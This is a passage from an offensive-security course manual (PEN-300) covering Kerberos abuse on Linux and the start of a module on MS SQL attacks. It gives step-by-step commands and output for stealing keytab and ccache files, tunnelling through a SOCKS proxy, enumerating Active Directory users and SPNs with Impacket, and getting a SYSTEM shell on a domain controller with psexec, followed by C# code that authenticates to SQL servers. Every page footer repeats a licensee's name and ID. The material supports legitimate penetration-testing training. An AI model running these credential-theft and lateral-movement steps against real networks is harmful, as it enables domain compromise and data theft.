Normally, keytab files would be written somewhere safe such as the user’s home folder. In our 
case, since we’ve compromised the server entirely and have root access, the location wouldn’t 
matter. 
Some users will set weak keytab file permissions for ease of use or for sharing 
with other accounts, so it’s worthwhile to check for readable keytabs if Kerberos 
is in use on the system. 
Now that our root user has the keytab files loaded, we can authenticate as the domain admin and 
access any resources they have access to. 
Let’s attempt to access the domain controller’s C drive. 
root@linuxvictim:~# smbclient -k -U "CORP1.COM\administrator" //DC01.CORP1.COM/C$ 
WARNING: The "syslog" option is deprecated 
Try "help" to get a list of possible commands. 
smb: \> ls 
  $Recycle.Bin                      DHS        0  Sat Sep 15 03:19:00 2018 
  Documents and Settings            DHS        0  Tue Jun  9 13:50:42 2020 
  pagefile.sys                      AHS 738197504  Fri Oct  2 11:25:15 2020 
  PerfLogs                            D        0  Mon Jun 15 15:04:37 2020 
  Program Files                      DR        0  Mon Jun 15 08:10:03 2020 
  Program Files (x86)                 D        0  Tue Jun  9 08:43:21 2020 
  ProgramData                        DH        0  Mon Jun 15 15:04:37 2020 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
567 
  Recovery                          DHS        0  Tue Jun  9 13:50:45 2020 
  SQL2019                             D        0  Tue Jun  9 08:34:53 2020 
  System Volume Information         DHS        0  Tue Jun  9 07:38:26 2020 
  Tools                               D        0  Mon Jun 15 08:09:24 2020 
  Users                              DR        0  Mon Jun 15 15:22:49 2020 
  Windows                             D        0  Mon Jun 15 15:04:45 2020 
 
                6395903 blocks of size 4096. 2185471 blocks available 
Listing 712 - Accessing the domain controller’s C drive as the domain admin 
Success! We can use our stolen keytab to access the domain controller using Kerberos 
authentication. 
14.3.2.1 Exercise 
1. 
Log in to the linuxvictim machine as the domain administrator, create a keytab, then log in as 
root in a different SSH session and steal the keytab. 
14.3.3 
Attacking Using Credential Cache Files 
As we turn our attention to attacking ccache files, let’s consider two attack scenarios. 
The first scenario is quite simple. If we compromise an active user’s shell session, we can 
essentially act as the user in question and use their current Kerberos tickets. Gaining an initial 
TGT would require the user’s Active Directory password. However, if the user is already 
authenticated, we can just use their current tickets. 
The second scenario is to authenticate by compromising a user’s ccache file. As we noted earlier, 
a user’s ccache file is stored in /tmp with a format like /tmp/krb5cc_. The file is typically only 
accessible by the owner. Because of this, it’s unlikely that we will be able to steal a user’s ccache 
file as an unprivileged user. 
If we have privileged access and don’t want to log in as the user in question, or we are able to 
read the user’s files but don’t have direct shell access, we can still copy the victim’s ccache file 
and load it as our own. 
Let’s explore this in greater detail. First, we’ll ssh to the linuxvictim machine as the offsec user 
who has sudo permissions. We can list the ccache files in /tmp with the following command. 
offsec@linuxvictim:~$ ls -al /tmp/krb5cc_* 
-rw------- 1 offsec                  offsec                 1430 Jul 30 15:17 
/tmp/krb5cc_1000 
-rw------- 1 administrator@corp1.com domain users@corp1.com 4016 Jul 30 15:11 
/tmp/krb5cc_607000500_3aeIA5 
Listing 713 - Listing ccache files in /tmp 
We can locate the domain administrator’s ccache file by inspecting the file owners. Let’s copy the 
domain administrator’s ccache file and set the ownership of the new file to our offsec user. 
offsec@linuxvictim:~$ sudo cp /tmp/krb5cc_607000500_3aeIA5 /tmp/krb5cc_minenow 
[sudo] password for offsec:  
 
offsec@linuxvictim:~$ sudo chown offsec:offsec /tmp/krb5cc_minenow 
 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
568 
offsec@linuxvictim:~$ ls -al /tmp/krb5cc_minenow 
-rw------- 1 offsec offsec 4016 Jul 30 15:20 /tmp/krb5cc_minenow 
Listing 714 - Copying the ccache file 
In order to use the ccache file, we need to set the KRB5CCNAME environment variable we 
discussed earlier. This variable gives the path of the credential cache file so that Kerberos utilities 
can find it. We’ll clear our old credentials, set the variable and point it to our newly-copied ccache 
file, then list our available tickets with klist. 
offsec@linuxvictim:~$ kdestroy 
 
offsec@linuxvictim:~$ klist 
klist: No credentials cache found (filename: /tmp/krb5cc_1000) 
 
offsec@linuxvictim:~$ export KRB5CCNAME=/tmp/krb5cc_minenow 
 
offsec@linuxvictim:~$ klist 
Ticket cache: FILE:/tmp/krb5cc_minenow 
Default principal: Administrator@CORP1.COM 
 
Valid starting       Expires              Service principal 
07/30/2020 15:11:10  07/31/2020 01:11:10  krbtgt/CORP1.COM@CORP1.COM 
        renew until 08/06/2020 15:11:08 
07/30/2020 15:11:41  07/31/2020 01:11:10  ldap/dc01.corp1.com@CORP1.COM 
        renew until 08/06/2020 15:11:08 
07/30/2020 15:11:57  07/31/2020 01:11:10  MSSQLSvc/DC01.corp1.com:1433@CORP1.COM 
        renew until 08/06/2020 15:11:08 
Listing 715 - Setting our ccache file and listing tickets 
Based on the output, we now have the administrator user’s TGT in our credential cache and we 
can request service tickets on their behalf. 
offsec@linuxvictim:~$ kvno MSSQLSvc/DC01.corp1.com:1433 
MSSQLSvc/DC01.corp1.com:1433@CORP1.COM: kvno = 2 
 
offsec@linuxvictim:~$ klist 
Ticket cache: FILE:/tmp/krb5cc_minenow 
Default principal: Administrator@CORP1.COM 
 
Valid starting       Expires              Service principal 
07/30/2020 15:11:10  07/31/2020 01:11:10  krbtgt/CORP1.COM@CORP1.COM 
        renew until 08/06/2020 15:11:08 
07/30/2020 15:11:41  07/31/2020 01:11:10  ldap/dc01.corp1.com@CORP1.COM 
        renew until 08/06/2020 15:11:08 
07/30/2020 15:11:57  07/31/2020 01:11:10  MSSQLSvc/DC01.corp1.com:1433@CORP1.COM 
        renew until 08/06/2020 15:11:08 
Listing 716 - Getting service tickets with our stolen ccache file 
Now that we have the user’s Kerberos tickets, we can use those tickets to authenticate to 
services that are Kerberos-enabled on the user’s behalf. In the next section, we’ll discuss using 
Impacket to do this. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
569 
14.3.4 
Using Kerberos with Impacket 
Impacket879 is a set of tools used for low-level manipulation of network protocols and exploiting 
network-based utilities. This toolset can also be used to abuse Kerberos on Linux. Impacket is 
available in Kali at /usr/share/doc/python3-impacket/. 
One popular module from Impacket is psexec. This module is similar to Microsoft Sysinternal’s 
psexec utility. It allows us to perform actions on a remote Windows host. 
In order to use Impacket utilities in our lab environment from our Kali VM, we need to do some 
initial setup. This will configure our Kali VM to be able to connect to the Kerberos environment 
properly. 
In the scenario described in this section, we assume that we have compromised a domain joined 
host (linuxvictim) and stolen a ccache file. Rather than perform any lateral movement from the 
linuxvictim box, we’ll execute our attack directly from our Kali system with Impacket. 
To do so, we’ll first need to copy our victim’s stolen ccache file to our Kali VM and set the 
KRB5CCNAME environment variable as we did previously on linuxvictim. We can use the same 
ccache file as the last example. 
kali@kali:~$ scp offsec@linuxvictim:/tmp/krb5cc_minenow /tmp/krb5cc_minenow 
offsec@linuxvictim's password:  
krb5cc_minenow                            100% 4016    43.6KB/s   00:00     
 
kali@kali:~$ export KRB5CCNAME=/tmp/krb5cc_minenow 
Listing 717 - Downloading the ccache file and setting the KRB5CCNAME environment variable 
As before, this will allow us to use the victim’s Kerberos tickets as our own. 
We’ll then need to install the Kerberos linux client utilities. This will allow us to perform our ticket 
manipulation tasks (such as kinit, etc.) that we performed earlier on our linuxvictim VM, but now 
from our Kali VM. 
kali@kali:~$ sudo apt install krb5-user 
... 
Listing 718 - Installing Kerberos client utilities 
When prompted for a kerberos realm, we’ll enter “corp1.com”. This lets the Kerberos tools know 
which domain we’re connecting to. 
We’ll need to add the domain controller IP to our Kali VM to resolve the domain properly. We can 
get the IP address of the domain controller from the linuxvictim VM. 
offsec@linuxvictim:~$ host corp1.com 
corp1.com has address 192.168.120.5 
Listing 719 - Getting the IP address of the domain controller 
Now that the client utilities are installed, the target domain controller (dc01.corp1.com) and the 
generic domain (corp1.com) need to be added to our /etc/hosts file. 
 
879 (Impacket, 2020), https://github.com/SecureAuthCorp/impacket 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
570 
127.0.0.1   localhost 
192.168.120.40  controller 
192.168.120.45  linuxvictim 
192.168.120.5 CORP1.COM DC01.CORP1.COM 
Listing 720 - Contents of our Kali VM’s /etc/hosts file 
This allows Kerberos to properly resolve the domain names for the domain controller. 
In order to use our Kerberos tickets, we will need to have the correct source IP, which in this case 
is the compromised linuxvictim host that is joined to the domain. Because of this, we’ll need to 
setup a SOCKS proxy on linuxvictim and use proxychains on Kali to pivot through the domain 
joined host when interacting with Kerberos. 
To do so, we’ll need to comment out the line for proxy_dns in /etc/proxychains.conf to prevent 
issues with domain name resolution while using proxychains. 
# proxychains.conf  VER 3.1 
# 
#        HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS. 
#        
... 
# Proxy DNS requests - no leak for DNS data 
#proxy_dns  
... 
Listing 721 - Commented out proxy_dns line in proxychains configuration 
Once these settings are in place, we need to set up a SOCKS server using ssh on the server we 
copied the ccache file from, which in our case is linuxvictim. 
kali@kali:~$ ssh offsec@linuxvictim -D 9050 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-20-generic x86_64) 
... 
offsec@linuxvictim:~$ 
Listing 722 - Setting up an SSH tunnel 
The 
-D parameter specifies the port we’ll be using for proxychains (defined in 
/etc/proxychains.conf) in order to tunnel Kerberos requests. 
Impacket has several scripts available that will help us enumerate and exploit Active Directory. 
For example, we can examine the list of domain users with GetADUsers.py. 
kali@kali:~$ proxychains python3 /usr/share/doc/python3-
impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip 192.168.120.5 
CORP1.COM/Administrator 
ProxyChains-3.1 (http://proxychains.sf.net) 
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation 
... 
[*] Querying DC01 for information about domain. 
Name                  Email                           PasswordLastSet      LastLogon            
--------------------  ------------------------------  -------------------  -----------
-------- 
Administrator                                         2020-06-09 07:07:34.259645  
2020-07-30 15:18:34.031633  
Guest                                                 <never>              <never>              
krbtgt                                                2020-06-09 07:22:08.937707  
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
571 
<never>              
offsec                                                2020-06-15 07:34:58.841850  
<never>              
setup                                                 2020-06-15 07:35:40.209134  
2020-06-15 15:24:01.455022  
sqlsvc                                                2020-06-15 07:37:26.049078  
2020-07-08 09:21:43.005075  
admin                                                 2020-06-15 07:39:32.340987  
2020-07-29 18:26:00.427117  
jeff                                                  2020-06-15 07:40:06.571361  
2020-06-15 15:23:15.203875  
dave                                                  2020-06-15 07:40:59.512944  
2020-07-30 09:27:53.384254  
Listing 723 - Listing Active Directory users 
The output contains a list of the domain users, highlighted above. 
It’s also possible to get a list of the SPNs available to our Kerberos user. 
kali@kali:~$ proxychains python3 /usr/share/doc/python3-
impacket/examples/GetUserSPNs.py -k -no-pass -dc-ip 192.168.120.5 
CORP1.COM/Administrator 
ProxyChains-3.1 (http://proxychains.sf.net) 
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation 
... 
ServicePrincipalName                    Name    MemberOf                                      
PasswordLastSet             LastLogon                   Delegation  
--------------------------------------  ------  --------------------------------------
------  --------------------------  --------------------------  ---------- 
MSSQLSvc/appsrv01.corp1.com:1433        sqlsvc  
CN=Administrators,CN=Builtin,DC=corp1,DC=com  2020-06-15 07:37:26.049078  2020-07-08 
09:21:43.005075              
MSSQLSvc/appsrv01.corp1.com:SQLEXPRESS  sqlsvc  
CN=Administrators,CN=Builtin,DC=corp1,DC=com  2020-06-15 07:37:26.049078  2020-07-08 
09:21:43.005075              
MSSQLSvc/dc01.corp1.com:1433            sqlsvc  
CN=Administrators,CN=Builtin,DC=corp1,DC=com  2020-06-15 07:37:26.049078  2020-07-08 
09:21:43.005075              
MSSQLSvc/dc01.corp1.com:SQLEXPRESS      sqlsvc  
CN=Administrators,CN=Builtin,DC=corp1,DC=com  2020-06-15 07:37:26.049078  2020-07-08 
09:21:43.005075   
Listing 724 - Gathering SPNs for our Kerberos user 
This time the output contains the list of SPNs available. 
If we want to gain a shell on the server, we can then run psexec with the following command. 
kali@kali:~$ proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py 
Administrator@DC01.CORP1.COM -k -no-pass 
ProxyChains-3.1 (http://proxychains.sf.net) 
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation 
... 
[*] Requesting shares on DC01.CORP1.COM..... 
[*] Found writable share ADMIN$ 
[*] Uploading file tDwixbpM.exe 
[*] Opening SVCManager on DC01.CORP1.COM..... 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
572 
[*] Creating service cEiR on DC01.CORP1.COM..... 
[*] Starting service cEiR..... 
... 
[!] Press help for extra shell commands 
... 
Microsoft Windows [Version 10.0.17763.1282] 
(c) 2018 Microsoft Corporation. All rights reserved. 
 
C:\Windows\system32> whoami 
nt authority\system 
 
C:\Windows\system32> 
Listing 725 - Getting a shell with psexec 
Using Impacket’s psexec module and our stolen Kerberos tickets, we are now SYSTEM on the 
domain controller and can do whatever we please. 
As we’ve demonstrated, Kerberos functionality on Linux can provide an excellent attack vector for 
compromising a domain and moving laterally within the network. Knowing how Linux handles 
Kerberos authentication and how to exploit it can make a significant difference in a penetration 
test. 
14.3.4.1 Exercises 
1. 
As root, steal the domain administrator’s ccache file and use it. 
2. 
Use Impacket to enumerate the AD user’s SPNs and get a shell on the domain controller. 
14.3.4.2 Extra Mile 
In addition to the attacks covered here, it’s also possible to combine techniques involving both 
Windows and Linux boxes. 
Log in to the Windows 10 client as the domain administrator user “administrator”, which will 
generate a TGT in memory. Next, create a reverse shell and use that to export the TGT back to 
your Kali machine. Transform the TGT into a ccache format. 
To simulate a firewalled network, use Impacket to pass the ticket to the domain controller. Try 
pivoting through the Windows 10 client to obtain a reverse shell. 
14.4 Wrapping Up 
In this module, we discussed a series of attacks focused on lateral movement in Linux. 
We covered several topics around SSH such as stealing keys, cracking passphrases, and 
hijacking sessions. We also discussed DevOps technologies such as Ansible and Artifactory. 
Finally, we covered the use of Kerberos on Linux and how to exploit it. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
573 
 
15 Microsoft SQL Attacks 
Regardless of their size or type, all organizations inevitably use databases both for data analysis 
and application data storage. Because they are so ubiquitous, and often contain high value data, 
databases are excellent targets during a penetration test. 
In this module, we will focus on Microsoft SQL (MS SQL) and how it can be leveraged during a 
penetration test to compromise Windows servers and obtain additional access within an 
organization. Our focus will be exclusively on MS SQL because it is typically integrated with Active 
Directory. Nevertheless, the concepts used in this module may also be applicable to SQL 
databases from other vendors. 
We are going to investigate a variety of MS SQL attack vectors such as enumeration, 
authentication, privilege escalation, and remote code execution. 
15.1 MS SQL in Active Directory 
Let’s begin with some of the fundamentals. First, we’ll discuss how to perform enumeration 
against MS SQL in an Active Directory environment. We’ll start with the assumption that we have 
already compromised a workstation or server and have access as an unprivileged domain user. 
Second, we’ll discuss Microsoft SQL authentication. We want to understand what kind of access 
an unprivileged domain user has to a Kerberos-integrated MS SQL server. 
Finally, we are going to combine this knowledge with traditional network attacks and compromise 
the operating system of the SQL server. 
15.1.1 
MS SQL Enumeration 
The traditional way to locate instances of SQL servers is through network scans with tools such 
as Nmap.880 MS SQL commonly operates on TCP port 1433, so a scan can be relatively quick. A 
broader port scan would reveal non-default ports that are in use, as is the case with named 
instances of MS SQL.881 
When a MS SQL server is running in the context of an Active Directory service account, it is 
normally associated with a Service Principal Name (SPN).882 The SPN is stored in the Active 
Directory and links the service account to the SQL server and its associated Windows server. 
Therefore, a more discreet way of locating instances of MS SQL in an Active Directory 
environment is to query the domain controller for all registered SPNs related to MS SQL. 
If we have compromised a domain-joined workstation in the context of a domain user, we can 
query the domain controller with the native setspn883 tool. To simulate this, we log in to the 
 
880 (Nmap, 2020), https://nmap.org/ 
881 (Microsoft, 2016), https://docs.microsoft.com/bs-cyrl-ba/sql/sql-server/install/instance-configuration?view=sql-server-2014 
882 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names 
883 (Microsoft, 2016), https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-
2012/cc731241(v%3Dws.11) 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
574 
Windows 10 client machine as the Offsec domain user. From a command prompt, we invoke 
setspn as given in Listing 726, specifying the domain with -T and a wildcard SPN with the -Q 
flag. 
C:\Tools> setspn -T corp1 -Q MSSQLSvc/* 
Checking domain DC=corp1,DC=com 
CN=SQLSvc,OU=Corp1ServiceAccounts,OU=Corp1Users,DC=corp1,DC=com 
        MSSQLSvc/appsrv01.corp1.com:1433 
        MSSQLSvc/appsrv01.corp1.com:SQLEXPRESS 
        MSSQLSvc/DC01.corp1.com:1433 
        MSSQLSvc/DC01.corp1.com:SQLEXPRESS 
 
Existing SPN found! 
Listing 726 - Enumerating Microsoft SQL with setspn 
From the output in Listing 726, we find two MS SQL instances in the domain with registered SPNs 
running on dc01 and appsrv01. 
In the real world, a domain controller would not host a SQL server, but the lab is 
structured this way for efficiency reasons. 
It’s also possible to get the same information through the .NET framework by using a PowerShell 
script or C# assembly. One such public example is the GetUsersSPNs.ps1 PowerShell script,884 
which is located in the C:\Tools folder on the Windows 10 client machine. 
Running the script gives similar output to what we found with setspn: 
PS C:\Tools> . .\GetUserSPNs.ps1 
 
ServicePrincipalName : kadmin/changepw 
Name                 : krbtgt 
SAMAccountName       : krbtgt 
MemberOf             : CN=Denied RODC Password Replication 
Group,CN=Users,DC=corp1,DC=com 
PasswordLastSet      : 11/13/2019 5:34:03 AM 
 
ServicePrincipalName : MSSQLSvc/appsrv01.corp1.com:1433 
Name                 : SQLSvc 
SAMAccountName       : SQLSvc 
MemberOf             : CN=Administrators,CN=Builtin,DC=corp1,DC=com 
PasswordLastSet      : 3/21/2020 11:49:25 AM 
 
ServicePrincipalName : MSSQLSvc/appsrv01.corp1.com:SQLEXPRESS 
Name                 : SQLSvc 
SAMAccountName       : SQLSvc 
MemberOf             : CN=Administrators,CN=Builtin,DC=corp1,DC=com 
PasswordLastSet      : 3/21/2020 11:49:25 AM 
 
 
884 (Tim Medin, 2016), https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
575 
ServicePrincipalName : MSSQLSvc/DC01.corp1.com:1433 
Name                 : SQLSvc 
SAMAccountName       : SQLSvc 
MemberOf             : CN=Administrators,CN=Builtin,DC=corp1,DC=com 
PasswordLastSet      : 3/21/2020 11:49:25 AM 
 
ServicePrincipalName : MSSQLSvc/DC01.corp1.com:SQLEXPRESS 
Name                 : SQLSvc 
SAMAccountName       : SQLSvc 
MemberOf             : CN=Administrators,CN=Builtin,DC=corp1,DC=com 
PasswordLastSet      : 3/21/2020 11:49:25 AM 
Listing 727 - Enumerating Microsoft SQL with GetUsersSPN 
The output from setspn and GetUserSPNs provides us with information about the hostname and 
TCP port for Kerberos-integrated MS SQL servers across the entire domain. 
We also obtain information about the service account context under which the SQL servers are 
running. In this case, both servers execute in the context of the SQLSvc domain account, which is 
a member of built-in Administrators group. This means that the service account is a local 
administrator on both of the Windows servers where it’s used. 
This information will be useful as we move forward with our attacks. 
15.1.1.1 Exercise 
1. 
Perform enumeration through SPNs to locate MS SQL databases in the domain. 
15.1.2 
MS SQL Authentication 
Now that we’ve gathered basic information about the location of our target SQL servers, the next 
step is to understand how Microsoft SQL authentication works, especially when it’s integrated 
with Active Directory. 
Authentication in MS SQL is implemented in two stages. First, a traditional login is required. This 
can be either an SQL server login or we can use Windows account-based authentication.885 SQL 
server login is performed with local accounts on each individual SQL server. Windows 
authentication on the other hand, works through Kerberos and allows any domain user to 
authenticate with a Ticket Granting Service (TGS) ticket. 
The second stage happens after a successful login. In this stage, the login is mapped to a 
database user account. 
As an example, we may perform a login with the built-in SQL server sa account, which will map to 
the dbo886 user account. If we perform a login with an account that has no associated SQL user 
account, it will automatically be mapped to the built-in guest user account. 
We’ve covered logins and user accounts, but we also need to cover the concept of SQL roles.887 A 
login such as sa, which is mapped to the dbo user, will have the sysadmin role. This essentially 
 
885 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/authentication-in-sql-server 
886 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/server-and-database-roles-in-sql-server 
887 (Microsoft, 2018), https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-
roles?view=sql-server-ver15 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
576 
makes it an administrator of the SQL server. On the other hand, a login that is mapped to the 
guest user will get the public role. 
In a typical SQL injection attack, we obtain the ability to execute SQL queries in 
the context of a specific SQL user account that has been given some role 
memberships. 
If Windows authentication is enabled, which is typically the case when the SQL server is 
integrated with Active Directory, we can authenticate through Kerberos, meaning we do not need 
to specify a password. 
To test this, we are going to create a C# console application that performs authentication against 
the SQL server running on dc01. Then we’ll attempt to execute some basic SQL enumeration 
queries. 
First, we open Visual Studio on the Windows 10 client machine in the context of the Offsec 
domain user and create a new C# console application called SQL. 
To create a connection to an MS SQL server, we use the SqlConnection888 class from the 
System.Data.SqlClient 
namespace. 
The 
constructor 
for 
SqlConnection 
requires 
a 
ConnectionString889 as an argument. The ConnectionString consists of several parts. 
The most important parts are the hostname of the server and the database name. In our case, we 
will connect to the database server on dc01.corp1.com. Since we don’t know anything about the 
database server structure, we need to select a database name that always exists. The default 
database in MS SQL is called “master”. 
Lastly, we must specify either the login and password or choose Windows Authentication with the 
“Integrated Security = True” setting. 
We need to specify all three parts of the connection string, which are separated by semicolons as 
shown in Listing 728. 
using System; 
using System.Data.SqlClient; 
 
namespace SQL 
{ 
    class Program 
    { 
        static void Main(string[] args) 
        { 
            String sqlServer = "dc01.corp1.com"; 
            String database = "master"; 
 
 
888 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.data.sqlclient.sqlconnection?view=netframework-4.8 
889 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/system.data.sqlclient.sqlconnection.connectionstring?view=netframework-4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
577 
            String conString = "Server = " + sqlServer + "; Database = " + database + 
"; Integrated Security = True;"; 
            SqlConnection con = new SqlConnection(conString); 
        } 
    } 
}             
Listing 728 - SqlConnection object instantiation 
Once the SqlConnection object has been created, we use the Open890 method to initiate the 
connection. 
If the connection attempt fails, an exception will occur. To handle this, we’ll wrap it in a try-catch 
clause as shown in Listing 729. 
... 
            SqlConnection con = new SqlConnection(conString); 
 
            try 
            { 
              con.Open(); 
              Console.WriteLine("Auth success!"); 
            } 
            catch 
            { 
              Console.WriteLine("Auth failed"); 
              Environment.Exit(0); 
            } 
 
            con.Close(); 
        } 
... 
Listing 729 - Opening SQL connection 
If the connection is successful, we report it with a message to the console and subsequently 
close the connection. Otherwise, we’ll report that and then exit the application. 
To test this code, we select Release and x64, and then compile it. Once compiled, we execute 
Sql.exe from the Windows 10 client machine as the Offsec user. 
PS C:\Tools> \\192.168.119.120\visualstudio\Sql\Sql\bin\Release\Sql.exe 
Auth success! 
Listing 730 - Authentication is successful 
According to the output, we have access to the database. 
This type of access is often possible on MS SQL because the Builtin\Users group has access by 
default, and the Domain Users group is a member of Builtin\Users. Since any domain account is a 
member of the Domain Users group, we automatically have access. 
Note that we do not need any credentials since the authentication relies on the Kerberos protocol. 
To complete this exercise, let’s disclose the SQL login we used along with the SQL user we are 
mapped to. In addition, we want to check which SQL server roles are available to us. 
 
890 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.data.sqlclient.sqlconnection.open?view=netframework-4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
578 
We will start with the SQL login. Once we have the code for that, the additional information will 
follow a similar coding pattern. The SYSTEM_USER891 SQL variable contains the name of the SQL 
login for the current session. If we can execute the SQL command “SELECT SYSTEM_USER;”, we 
should get the SQL login. 
To execute an arbitrary SQL query from C# while also obtaining the result of that query, we can 
use the SqlCommand class.892 Instantiating an object from this class requires two arguments: the 
SQL query and the open connection to the SQL server. 
Since we are already able to open a connection to the SQL server with our previous code, we can 
append the following code. 
... 
              Environment.Exit(0); 
            } 
 
            String querylogin = "SELECT SYSTEM_USER;"; 
            SqlCommand command = new SqlCommand(querylogin, con); 
            SqlDataReader reader = command.ExecuteReader(); 
 
            con.Close(); 
        } 
... 
Listing 731 - Creating SqlCommand object 
Note that both SQL queries and C# statements always terminate with a semicolon. 
To execute the SQL query, we invoke the ExecuteReader893 method, which forwards it to the SQL 
server and returns a SqlDataReader894 object. 
Before we can gain access to the desired data, we must call the Read895 method, which returns 
the result of the query. 
The code required to execute this is shown in Listing 732. 
... 
            SqlDataReader reader = command.ExecuteReader(); 
            reader.Read(); 
            Console.WriteLine("Logged in as: " + reader[0]); 
            reader.Close(); 
 
            con.Close(); 
... 
Listing 732 - Executing the SQL query with SqlDataReader 
 
891 (Microsoft, 2017), https://docs.microsoft.com/en-us/sql/t-sql/functions/system-user-transact-sql?view=sql-server-ver15 
892 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.data.sqlclient.sqlcommand?view=netframework-4.8 
893 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/system.data.sqlclient.sqlcommand.executereader?view=netframework-4.8 
894 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.data.sqlclient.sqldatareader?view=netframework-4.8 
895 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.data.sqlclient.sqldatareader.read?view=netframework-
4.8#System_Data_SqlClient_SqlDataReader_Read 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
579 
After we have fetched the results of the SQL query, we can access them from the SqlDataReader 
object using indexing,896 where the array index specifies the zero-based column ordinal in the 
retrieved data row. 
Next we print the result to the console. It’s important to invoke the Close897 method on the 
SqlDataReader object to allow subsequent SQL queries to be executed. If we don’t, the SQL 
connection will be blocked. 
Once we have obtained our login, we want to determine the username it is mapped to. We’ll do 
this with the USER_NAME()898 function. This is very similar to what we did with SYSTEM_USER. 
Finally, the IS_SRVROLEMEMBER899 function can be used to determine if a specific login is a 
member of a server role. 
The IS_SRVROLEMEMBER function accepts the name of the role and returns a boolean value. An 
implementation that determines whether our login is a member of the public role is shown in 
Listing 733. 
... 
            reader.Close(); 
 
            String querypublicrole = "SELECT IS_SRVROLEMEMBER('public');"; 
            command = new SqlCommand(querypublicrole, con); 
            reader = command.ExecuteReader(); 
            reader.Read(); 
            Int32 role = Int32.Parse(reader[0].ToString()); 
            if(role == 1) 
            { 
              Console.WriteLine("User is a member of public role"); 
            } 
            else 
            { 
              Console.WriteLine("User is NOT a member of public role"); 
            } 
            reader.Close(); 
 
            con.Close(); 
... 
Listing 733 - Finding role membership 
We can use a similar method to discover any other role memberships. 
Listing 734 shows the result of our application after it checks the SQL login, the username, and 
for membership of the public and sysadmin roles.  
 
896 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.data.sqlclient.sqldatareader.item?view=netframework-
4.8#System_Data_SqlClient_SqlDataReader_Item_System_Int32_ 
897 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.data.sqlclient.sqldatareader.close?view=netframework-
4.8#System_Data_SqlClient_SqlDataReader_Close 
898 (Microsoft, 2017), https://docs.microsoft.com/en-us/sql/t-sql/functions/user-name-transact-sql?view=sql-server-ver15 
899 (Microsoft, 2017), https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
580 
PS C:\Tools> \\192.168.119.120\visualstudio\Sql\Sql\bin\Release\Sql.exe 
Auth success! 
Logged in as: corp1\offsec 
Mapped to the user: guest 
User is a member of public role 
User is NOT a member of sysadmin role 
Listing 734 - Login, user name and role memberships 
From the output of our console application, we note that we logged in with our domain account, 
which is mapped to the guest user account. Additionally, we have the public role, but not 
sysadmin role membership. 
While this is a low privilege access, it’s important to note that we have access to the database 
and can execute SQL commands, all without requiring the password of our current user. 
In the rest of this module, we are going to expand our access beyond the database instance to 
the underlying operating system and additional servers. 
15.1.2.1 Exercises 
1. 
Execute the code to authenticate to the SQL server on dc01 as shown in this section. 
2. 
Complete the C# implementation that fetches the SQL login, username, and role 
memberships. 
15.1.3 
